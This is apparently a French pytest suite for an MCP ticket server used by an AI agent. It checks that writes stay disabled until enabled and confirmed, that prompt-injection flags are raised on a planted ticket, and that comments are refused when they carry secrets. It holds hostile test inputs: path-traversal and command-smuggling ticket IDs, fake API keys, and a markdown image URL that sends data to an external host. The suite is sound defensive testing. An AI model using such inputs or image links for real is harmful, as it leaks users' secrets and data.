"""Tickets : lecture, injection signalée, écriture refusée sans activation ni confirmation, anti-exfiltration."""
from __future__ import annotations

import json

import pytest

import tickets_server as ts
from conftest import appeler, texte, dernier_appel


def test_list_tickets_resume_sans_description():
    data = appeler(ts.mcp, "list_tickets", {"statut": "OUVERT"}).structured_content
    assert data["count"] == 5
    assert all("description" not in t for t in data["tickets"])


def test_get_ticket_injection_signalee(journal):
    data = appeler(ts.mcp, "get_ticket", {"ticket_id": "NEO-142"}).structured_content
    assert data["trust"] == "untrusted"
    for drapeau in ("commentaire_cache_pour_ia", "appel_outil_demande", "demande_de_secret", "dissimulation"):
        assert drapeau in data["injection_flags"]
    assert dernier_appel(journal)["injection_flags"]


def test_ticket_sain_sans_drapeau():
    data = appeler(ts.mcp, "get_ticket", {"ticket_id": "NEO-131"}).structured_content
    assert data["injection_flags"] == []


@pytest.mark.parametrize("ident", ["../etc/passwd", "NEO-1; DROP", "neo-142"])
def test_identifiant_invalide(ident, journal):
    assert appeler(ts.mcp, "get_ticket", {"ticket_id": ident}).is_error
    assert dernier_appel(journal)["reason"] == "arguments_invalides"


def test_ecriture_desactivee_par_defaut(tmp_path, journal):
    res = appeler(ts.mcp, "comment_ticket", {"ticket_id": "NEO-131", "body": "Analyse jointe au ticket.", "confirm": True})
    assert res.is_error and "REFUS [lecture_seule]" in texte(res)
    assert not (tmp_path / "tickets-etat.json").exists()
    evt = dernier_appel(journal)
    assert (evt["decision"], evt["reason"], evt["tool"]) == ("refused", "lecture_seule", "comment_ticket")


def test_confirmation_explicite_requise(monkeypatch, tmp_path):
    monkeypatch.setenv("NEOFLOW_TICKETS_WRITE", "on")
    res = appeler(ts.mcp, "comment_ticket", {"ticket_id": "NEO-131", "body": "Cause racine : NPE sur montant nul."})
    assert res.is_error and "confirmation_requise" in texte(res) and "Aperçu" in texte(res)
    assert not (tmp_path / "tickets-etat.json").exists()


@pytest.mark.parametrize("corps, code", [
    ("Pour reproduire : neoflow.notification.api-key: FAUX-JETON-DEMO-0000", "secret_detecte"),  # gitleaks:allow (valeur factice de test)
    ("Clé utilisée : sk-ant-api03-AAAAAAAAAAAAAAAA", "secret_detecte"),  # gitleaks:allow (valeur factice de test)
    ("Voir ![capture](https://collecte.example.net/x?d=abc)", "url_externe"),
])
def test_exfiltration_refusee_meme_confirmee(monkeypatch, corps, code, journal):
    monkeypatch.setenv("NEOFLOW_TICKETS_WRITE", "on")
    res = appeler(ts.mcp, "comment_ticket", {"ticket_id": "NEO-142", "body": corps, "confirm": True})
    assert res.is_error and f"REFUS [{code}]" in texte(res)
    evt = dernier_appel(journal)
    assert evt["reason"] == code
    assert "FAUX-JETON" not in json.dumps(evt) and "sk-ant-api03" not in json.dumps(evt)  # secret masqué au journal


def test_ecriture_confirmee_idempotente(monkeypatch):
    monkeypatch.setenv("NEOFLOW_TICKETS_WRITE", "on")
    args = {"ticket_id": "NEO-131", "body": "Cause racine identifiée : conversion du montant nul.",
            "confirm": True, "idempotency_key": "j06-tp3-0001"}
    premier = appeler(ts.mcp, "comment_ticket", args).structured_content
    second = appeler(ts.mcp, "comment_ticket", args).structured_content
    assert premier["status"] == "cree" and premier["auteur"] == "svc-opencode-test"
    assert second == {"status": "deja_cree", "comment_id": premier["comment_id"], "ticket_id": "NEO-131",
                      "sources": [f"ticket:NEO-131#{premier['comment_id']}"]}
    ticket = appeler(ts.mcp, "get_ticket", {"ticket_id": "NEO-131"}).structured_content["ticket"]
    assert [c["auteur"] for c in ticket["commentaires"]].count("svc-opencode-test") == 1


def test_ticket_inconnu():
    res = appeler(ts.mcp, "get_ticket", {"ticket_id": "NEO-999"})
    assert res.is_error and "ticket_inconnu" in texte(res)


def test_ressource_et_prompt():
    import asyncio
    from fastmcp import Client

    async def _run():
        async with Client(ts.mcp) as c:
            modeles = await c.list_resource_templates()
            contenu = await c.read_resource("tickets://NEO-123")
            prompts = await c.list_prompts()
            return [m.uri_template for m in modeles], contenu[0].text, [p.name for p in prompts]
    modeles, contenu, prompts = asyncio.run(_run())
    assert modeles == ["tickets://{ticket_id}"]
    assert json.loads(contenu)["id"] == "NEO-123"
    assert prompts == ["analyser_ticket"]
